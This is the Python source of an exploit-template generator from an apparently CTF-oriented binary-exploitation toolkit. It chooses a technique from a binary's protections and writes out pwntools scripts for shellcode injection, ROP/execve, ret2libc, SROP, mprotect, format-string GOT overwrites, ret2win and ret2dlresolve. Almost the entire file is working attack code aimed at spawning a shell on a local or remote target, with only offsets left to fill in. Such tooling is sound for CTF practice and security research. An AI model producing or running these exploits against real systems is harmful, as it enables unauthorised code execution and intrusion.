"""
Exploit Template Generator.

Generates ready-to-use Python exploit scripts based on binary characteristics
and detected vulnerabilities.
"""

from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Dict, List, Optional, Any
from enum import Enum, auto

if TYPE_CHECKING:
    from supwngo.core.binary import Binary
    from supwngo.exploit.strategy import StrategyReport

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class TemplateType(Enum):
    """Type of exploit template."""
    SHELLCODE = auto()      # Direct shellcode injection
    ROP_EXECVE = auto()     # ROP to execve syscall
    ROP_SYSTEM = auto()     # ret2libc system()
    SROP = auto()           # Sigreturn-oriented programming
    MPROTECT = auto()       # mprotect + shellcode
    FORMAT_STRING = auto()  # Format string exploitation
    RET2WIN = auto()        # Return to win function
    RET2DLRESOLVE = auto()  # ret2dlresolve
    LEAK_AND_ROP = auto()   # Two-stage leak + ROP
    GENERIC = auto()        # Generic template


@dataclass
class ExploitTemplate:
    """Generated exploit template."""
    name: str
    template_type: TemplateType
    code: str
    description: str
    requirements: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    def save(self, path: str):
        """Save template to file."""
        with open(path, 'w') as f:
            f.write(self.code)
        logger.info(f"Template saved to {path}")


class TemplateGenerator:
    """Generate exploit templates based on binary analysis."""

    def __init__(
        self,
        binary: "Binary",
        strategy_report: Optional["StrategyReport"] = None,
    ):
        """
        Initialize template generator.

        Args:
            binary: Target binary
            strategy_report: Optional strategy analysis report
        """
        self.binary = binary
        self.report = strategy_report

    def generate(self, template_type: TemplateType = None) -> ExploitTemplate:
        """
        Generate exploit template.

        Args:
            template_type: Type of template to generate (auto-detect if None)

        Returns:
            ExploitTemplate with ready-to-use code
        """
        if template_type is None:
            template_type = self._detect_best_template()

        generators = {
            TemplateType.SHELLCODE: self._gen_shellcode_template,
            TemplateType.ROP_EXECVE: self._gen_rop_execve_template,
            TemplateType.ROP_SYSTEM: self._gen_ret2libc_template,
            TemplateType.SROP: self._gen_srop_template,
            TemplateType.MPROTECT: self._gen_mprotect_template,
            TemplateType.FORMAT_STRING: self._gen_format_string_template,
            TemplateType.RET2WIN: self._gen_ret2win_template,
            TemplateType.RET2DLRESOLVE: self._gen_ret2dlresolve_template,
            TemplateType.LEAK_AND_ROP: self._gen_leak_rop_template,
            TemplateType.GENERIC: self._gen_generic_template,
        }

        generator = generators.get(template_type, self._gen_generic_template)
        return generator()

    def generate_all(self) -> List[ExploitTemplate]:
        """Generate all applicable templates."""
        templates = []

        # Check which templates are applicable
        prots = self.binary.protections

        if not prots.nx:
            templates.append(self._gen_shellcode_template())

        if not prots.canary and not prots.pie:
            templates.append(self._gen_rop_execve_template())

        if not prots.canary and not prots.pie and not getattr(prots, 'static', False):
            templates.append(self._gen_ret2libc_template())

        if self.report and self.report.has_win_function:
            templates.append(self._gen_ret2win_template())

        if getattr(prots, 'static', False):
            templates.append(self._gen_srop_template())

        templates.append(self._gen_generic_template())

        return templates

    def _detect_best_template(self) -> TemplateType:
        """Detect best template type based on protections."""
        prots = self.binary.protections

        # Check for win function first
        if self.report and self.report.has_win_function:
            return TemplateType.RET2WIN

        # NX disabled -> shellcode
        if not prots.nx:
            return TemplateType.SHELLCODE

        # Static binary -> SROP or ROP_EXECVE
        if getattr(prots, 'static', False):
            return TemplateType.SROP

        # Dynamic binary -> ret2libc
        if not getattr(prots, 'static', False):
            if prots.pie:
                return TemplateType.LEAK_AND_ROP
            return TemplateType.ROP_SYSTEM

        return TemplateType.GENERIC

    def _gen_shellcode_template(self) -> ExploitTemplate:
        """Generate shellcode injection template."""
        code = f'''#!/usr/bin/env python3
"""
Shellcode Injection Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

NX is disabled - direct shellcode execution possible.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

# Set architecture
context.binary = BINARY
context.log_level = "info"

def exploit():
    # Load binary
    elf = ELF(BINARY)

    # Connect
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # TODO: Find offset to return address
    offset = 0  # <-- ADJUST THIS

    # Generate shellcode
    shellcode = asm(shellcraft.sh())

    # Alternative shellcodes:
    # shellcode = asm(shellcraft.cat("/flag.txt"))
    # shellcode = b"\\x48\\x31..." # custom shellcode

    # Build payload
    # Option 1: Shellcode in buffer, return to buffer
    payload = shellcode
    payload += b"A" * (offset - len(shellcode))
    payload += p{self.binary.bits}(0xDEADBEEF)  # <-- Return address (buffer address)

    # Option 2: Use jmp rsp gadget if available
    # jmp_rsp = elf.search(asm("jmp rsp")).__next__()
    # payload = b"A" * offset + p64(jmp_rsp) + shellcode

    log.info(f"Payload length: {{len(payload)}}")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="shellcode_exploit",
            template_type=TemplateType.SHELLCODE,
            code=code,
            description="Direct shellcode injection (NX disabled)",
            requirements=["NX disabled", "Buffer address known or jmp rsp gadget"],
            notes=["Find buffer overflow offset first", "Check for bad characters"],
        )

    def _gen_rop_execve_template(self) -> ExploitTemplate:
        """Generate ROP execve template."""
        if self.binary.bits == 64:
            syscall_num = 59
            regs = "rdi, rsi, rdx, rax"
        else:
            syscall_num = 11
            regs = "ebx, ecx, edx, eax"

        code = f'''#!/usr/bin/env python3
"""
ROP execve Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Builds ROP chain to execute execve("/bin/sh", NULL, NULL)
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    rop = ROP(elf)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # TODO: Find offset to return address
    offset = 0  # <-- ADJUST THIS

    # Find /bin/sh string (or write to BSS)
    binsh = next(elf.search(b"/bin/sh\\x00"), None)
    if not binsh:
        # Write /bin/sh to BSS
        bss = elf.bss()
        # TODO: Add write gadgets to chain
        binsh = bss

    # Build ROP chain
    # syscall: execve("/bin/sh", NULL, NULL)
    # {regs} = /bin/sh, 0, 0, {syscall_num}
{"" if self.binary.bits == 64 else '''
    # 32-bit: use int 0x80
    rop.raw(rop.find_gadget(["pop ebx", "ret"])[0])
    rop.raw(binsh)
    rop.raw(rop.find_gadget(["pop ecx", "ret"])[0])
    rop.raw(0)
    rop.raw(rop.find_gadget(["pop edx", "ret"])[0])
    rop.raw(0)
    rop.raw(rop.find_gadget(["pop eax", "ret"])[0])
    rop.raw(11)  # execve syscall number
    rop.raw(elf.search(asm("int 0x80")).__next__())
'''}
{"    # 64-bit: use syscall" if self.binary.bits == 64 else ""}
{"    rop.rdi = binsh" if self.binary.bits == 64 else ""}
{"    rop.rsi = 0" if self.binary.bits == 64 else ""}
{"    rop.rdx = 0" if self.binary.bits == 64 else ""}
{"    rop.rax = 59  # execve" if self.binary.bits == 64 else ""}
{"    rop.raw(rop.find_gadget(['syscall', 'ret'])[0])" if self.binary.bits == 64 else ""}

    # Build payload
    payload = b"A" * offset
    payload += rop.chain()

    log.info(f"ROP chain length: {{len(rop.chain())}}")
    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="rop_execve_exploit",
            template_type=TemplateType.ROP_EXECVE,
            code=code,
            description="ROP chain to execve syscall",
            requirements=["pop rdi/rsi/rdx/rax gadgets", "syscall gadget", "/bin/sh string"],
            notes=["Works on static binaries", "May need to write /bin/sh to BSS"],
        )

    def _gen_ret2libc_template(self) -> ExploitTemplate:
        """Generate ret2libc template."""
        code = f'''#!/usr/bin/env python3
"""
ret2libc Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Calls system("/bin/sh") via libc.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
LIBC = ""  # Set libc path if known
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    rop = ROP(elf)

    libc = ELF(LIBC) if LIBC else None

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)
        if not libc:
            libc = io.libc

    # TODO: Find offset to return address
    offset = 0  # <-- ADJUST THIS

    # Stage 1: Leak libc address
    log.info("Stage 1: Leaking libc address...")

    # Leak puts@got via puts@plt
    rop.puts(elf.got["puts"])
    rop.call(elf.symbols["main"])  # Return to main for stage 2

    payload1 = b"A" * offset + rop.chain()
    io.sendline(payload1)

    # Receive leak
    io.recvuntil(b"\\n")  # Adjust based on output
    leak = u{self.binary.bits}(io.recv({"6" if self.binary.bits == 64 else "4"}).ljust({"8" if self.binary.bits == 64 else "4"}, b"\\x00"))
    log.success(f"puts@libc: {{hex(leak)}}")

    # Calculate libc base
    libc.address = leak - libc.symbols["puts"]
    log.success(f"libc base: {{hex(libc.address)}}")

    # Stage 2: Call system("/bin/sh")
    log.info("Stage 2: Calling system('/bin/sh')...")

    rop2 = ROP(elf)
{"    rop2.raw(rop2.find_gadget(['ret'])[0])  # Stack alignment" if self.binary.bits == 64 else ""}
    rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\\x00"))])

    payload2 = b"A" * offset + rop2.chain()
    io.sendline(payload2)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="ret2libc_exploit",
            template_type=TemplateType.ROP_SYSTEM,
            code=code,
            description="ret2libc to system('/bin/sh')",
            requirements=["Libc leak", "pop rdi gadget (64-bit)"],
            notes=["64-bit needs stack alignment (ret gadget)", "Use libc-database to identify libc"],
        )

    def _gen_srop_template(self) -> ExploitTemplate:
        """Generate SROP template."""
        code = f'''#!/usr/bin/env python3
"""
SROP (Sigreturn-Oriented Programming) Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Uses sigreturn to set all registers at once for execve.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # TODO: Find these addresses
    offset = 0  # <-- Offset to return address
    syscall_ret = 0  # <-- Address of syscall; ret gadget
    binsh_addr = 0  # <-- Address of "/bin/sh" string

    # Find /bin/sh in binary
    binsh = next(elf.search(b"/bin/sh\\x00"), None)
    if binsh:
        binsh_addr = binsh

    # Build SROP frame
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = {"59" if self.binary.bits == 64 else "11"}  # execve syscall number
    frame.rdi = binsh_addr  # /bin/sh
    frame.rsi = 0  # argv = NULL
    frame.rdx = 0  # envp = NULL
    frame.rip = syscall_ret  # Return to syscall

    # Build payload
    # First trigger sigreturn (rax = 15)
    payload = b"A" * offset
    payload += p{self.binary.bits}(syscall_ret)  # Trigger syscall
    payload += bytes(frame)

    # Note: Need to set rax = {"15" if self.binary.bits == 64 else "119"} (SYS_rt_sigreturn/sigreturn) before syscall
    # This might require: pop rax; ret gadget OR read exactly 15 bytes

    log.info(f"SROP frame size: {{len(bytes(frame))}}")
    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="srop_exploit",
            template_type=TemplateType.SROP,
            code=code,
            description="Sigreturn-oriented programming to execve",
            requirements=["syscall gadget", "Way to set rax=15"],
            notes=[
                "SROP frame is 248 bytes (64-bit)",
                "Perfect for minimal/static binaries",
                "Can use read() return value to set rax",
            ],
        )

    def _gen_mprotect_template(self) -> ExploitTemplate:
        """Generate mprotect + shellcode template."""
        code = f'''#!/usr/bin/env python3
"""
mprotect + Shellcode Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Uses mprotect to make a region executable, then reads and executes shellcode.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # TODO: Find these addresses
    offset = 0  # <-- Offset to return address

    # Gadgets needed
    pop_rdi = 0  # <-- pop rdi; ret
    pop_rsi = 0  # <-- pop rsi; ret (or pop rsi; pop r15; ret)
    pop_rdx = 0  # <-- pop rdx; ret
    pop_rax = 0  # <-- pop rax; ret
    syscall_ret = 0  # <-- syscall; ret

    # Target region (page-aligned BSS or similar)
    bss = elf.bss()
    target = bss & ~0xfff  # Page-align

    # Stage 1: mprotect(target, 0x1000, 7)  # PROT_READ|PROT_WRITE|PROT_EXEC
    # syscall number: 10 (mprotect)

    rop_chain = b""

    # Set up mprotect: rdi=addr, rsi=len, rdx=prot, rax=10
    rop_chain += p64(pop_rdi) + p64(target)
    rop_chain += p64(pop_rsi) + p64(0x1000)  # + p64(0) if pop rsi; pop r15; ret
    rop_chain += p64(pop_rdx) + p64(7)  # PROT_RWX
    rop_chain += p64(pop_rax) + p64(10)  # SYS_mprotect
    rop_chain += p64(syscall_ret)

    # KEY INSIGHT: After mprotect returns:
    # - rax = 0 (success, which is also SYS_read!)
    # - rdi is still our target address (close to what we need for fd)

    # Stage 2: read(0, target, size)
    # After mprotect: rax=0 (read syscall!), rdi unchanged
    # Just need to adjust rdi to 0 (stdin) and set rsi, rdx

    rop_chain += p64(pop_rdi) + p64(0)  # fd = stdin
    rop_chain += p64(pop_rsi) + p64(target)  # buf = our target
    rop_chain += p64(pop_rdx) + p64(0x100)  # count
    # rax is already 0 from mprotect return!
    rop_chain += p64(syscall_ret)

    # Stage 3: Jump to shellcode
    rop_chain += p64(target)

    # Build payload
    payload = b"A" * offset
    payload += rop_chain

    log.info(f"Payload length: {{len(payload)}}")
    io.sendline(payload)

    # Send shellcode
    shellcode = asm(shellcraft.sh())
    sleep(0.5)
    io.send(shellcode)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="mprotect_exploit",
            template_type=TemplateType.MPROTECT,
            code=code,
            description="mprotect to make region executable + shellcode",
            requirements=["pop rdi/rsi/rdx/rax gadgets", "syscall gadget", "Writable region"],
            notes=[
                "After mprotect, rax=0 which is SYS_read!",
                "This trick saves gadgets in the chain",
                "Used in crossbow challenge",
            ],
        )

    def _gen_format_string_template(self) -> ExploitTemplate:
        """Generate format string template."""
        code = f'''#!/usr/bin/env python3
"""
Format String Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Uses format string vulnerability to leak and overwrite.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Step 1: Find format string offset
    # Send: AAAAAAAA%p.%p.%p...
    # Look for 0x4141414141414141

    def send_fmt(payload):
        io.sendline(payload)
        return io.recvline()

    # Find offset
    for i in range(1, 50):
        io = process(BINARY)
        io.sendline(f"AAAAAAAA%{{i}}$p".encode())
        result = io.recvall(timeout=1)
        if b"0x4141414141414141" in result:
            log.success(f"Format string offset: {{i}}")
            offset = i
            break
        io.close()
    else:
        offset = 6  # Common default

    # Step 2: Leak addresses
    io = process(BINARY) if not REMOTE_HOST else remote(REMOTE_HOST, REMOTE_PORT)

    # Leak stack/libc/canary
    leaks = {{}}
    for i in range(1, 20):
        io.sendline(f"%{{i}}$p".encode())
        result = io.recvline()
        try:
            leak = int(result.strip(), 16)
            leaks[i] = leak
            log.info(f"Leak [{{i}}]: {{hex(leak)}}")
        except:
            pass

    # Step 3: Overwrite GOT entry
    # Use pwntools fmtstr_payload

    target_got = elf.got["puts"]  # or other function
    target_addr = 0xDEADBEEF  # system or one_gadget

    payload = fmtstr_payload(offset, {{target_got: target_addr}})
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="format_string_exploit",
            template_type=TemplateType.FORMAT_STRING,
            code=code,
            description="Format string vulnerability exploitation",
            requirements=["printf-like function with controlled format"],
            notes=[
                "Use %p to leak, %n to write",
                "pwntools fmtstr_payload() handles complexity",
                "Full RELRO blocks GOT overwrite",
            ],
        )

    def _gen_ret2win_template(self) -> ExploitTemplate:
        """Generate ret2win template."""
        win_addr = self.report.win_function_addr if self.report else 0

        code = f'''#!/usr/bin/env python3
"""
ret2win Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Simple return to win function.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Win function address
    win = {f"0x{win_addr:x}" if win_addr else "elf.symbols['win']  # <-- ADJUST"}

    # TODO: Find offset to return address
    offset = 0  # <-- ADJUST THIS

    # Build payload
    payload = b"A" * offset
{"    payload += p64(elf.symbols['ret'])  # Stack alignment (64-bit)" if self.binary.bits == 64 else ""}
    payload += p{self.binary.bits}(win)

    log.info(f"Payload length: {{len(payload)}}")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="ret2win_exploit",
            template_type=TemplateType.RET2WIN,
            code=code,
            description="Return to win function",
            requirements=["Win function exists", "Buffer overflow"],
            notes=[
                "Simplest exploitation technique",
                "64-bit may need stack alignment",
                "Check if win function needs arguments",
            ],
        )

    def _gen_ret2dlresolve_template(self) -> ExploitTemplate:
        """Generate ret2dlresolve template."""
        code = f'''#!/usr/bin/env python3
"""
ret2dlresolve Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Uses ret2dlresolve to call arbitrary libc function without leak.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    rop = ROP(elf)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # TODO: Find offset to return address
    offset = 0  # <-- ADJUST THIS

    # Use pwntools Ret2dlresolvePayload
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

    rop.read(0, dlresolve.data_addr)  # Read fake structures
    rop.ret2dlresolve(dlresolve)      # Trigger resolution

    payload = b"A" * offset
    payload += rop.chain()
    payload += dlresolve.payload

    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    sleep(0.5)
    io.send(dlresolve.payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="ret2dlresolve_exploit",
            template_type=TemplateType.RET2DLRESOLVE,
            code=code,
            description="ret2dlresolve to call arbitrary function",
            requirements=["Partial RELRO or less", "Writable memory"],
            notes=[
                "No libc leak needed",
                "Blocked by Full RELRO",
                "pwntools handles structure forgery",
            ],
        )

    def _gen_leak_rop_template(self) -> ExploitTemplate:
        """Generate two-stage leak + ROP template."""
        code = f'''#!/usr/bin/env python3
"""
Leak and ROP Exploit
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)

Two-stage: 1) Leak addresses 2) ROP with leaked info
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
LIBC = ""
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    libc = ELF(LIBC) if LIBC else None

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)
        if not libc:
            libc = io.libc

    # TODO: Find offset
    offset = 0  # <-- ADJUST THIS

    # ==================
    # Stage 1: Leak
    # ==================
    log.info("Stage 1: Leaking addresses...")

    rop1 = ROP(elf)
    rop1.puts(elf.got["puts"])
    rop1.call(elf.symbols["main"])

    payload1 = b"A" * offset + rop1.chain()
    io.sendline(payload1)

    # Parse leak
    io.recvuntil(b"\\n")
    leak = u{self.binary.bits}(io.recv({"6" if self.binary.bits == 64 else "4"}).ljust({"8" if self.binary.bits == 64 else "4"}, b"\\x00"))
    log.success(f"puts leak: {{hex(leak)}}")

    libc.address = leak - libc.symbols["puts"]
    log.success(f"libc base: {{hex(libc.address)}}")

    # ==================
    # Stage 2: Shell
    # ==================
    log.info("Stage 2: Getting shell...")

    rop2 = ROP(elf)
{"    rop2.raw(rop2.find_gadget(['ret'])[0])" if self.binary.bits == 64 else ""}
    rop2.system(next(libc.search(b"/bin/sh\\x00")))

    payload2 = b"A" * offset + rop2.chain()
    io.sendline(payload2)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="leak_and_rop_exploit",
            template_type=TemplateType.LEAK_AND_ROP,
            code=code,
            description="Two-stage leak + ROP exploitation",
            requirements=["Libc leak method", "Return to vulnerable function"],
            notes=["Standard approach for PIE/ASLR", "Identify libc with libc-database"],
        )

    def _gen_generic_template(self) -> ExploitTemplate:
        """Generate generic template."""
        code = f'''#!/usr/bin/env python3
"""
Generic Exploit Template
Binary: {self.binary.path.name}
Architecture: {self.binary.arch} ({self.binary.bits}-bit)
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
LIBC = ""
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    rop = ROP(elf)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Binary info
    log.info(f"Entry: {{hex(elf.entry)}}")
    log.info(f"BSS: {{hex(elf.bss())}}")

    # TODO: Implement exploit
    offset = 0  # <-- Find offset to return address

    payload = b"A" * offset
    # Add ROP chain or shellcode here

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''
        return ExploitTemplate(
            name="generic_exploit",
            template_type=TemplateType.GENERIC,
            code=code,
            description="Generic exploit template",
            requirements=[],
            notes=["Customize based on vulnerability type"],
        )


# Convenience function
def generate_template(
    binary: "Binary",
    template_type: TemplateType = None,
    strategy_report: "StrategyReport" = None,
) -> ExploitTemplate:
    """Generate exploit template for binary."""
    generator = TemplateGenerator(binary, strategy_report)
    return generator.generate(template_type)
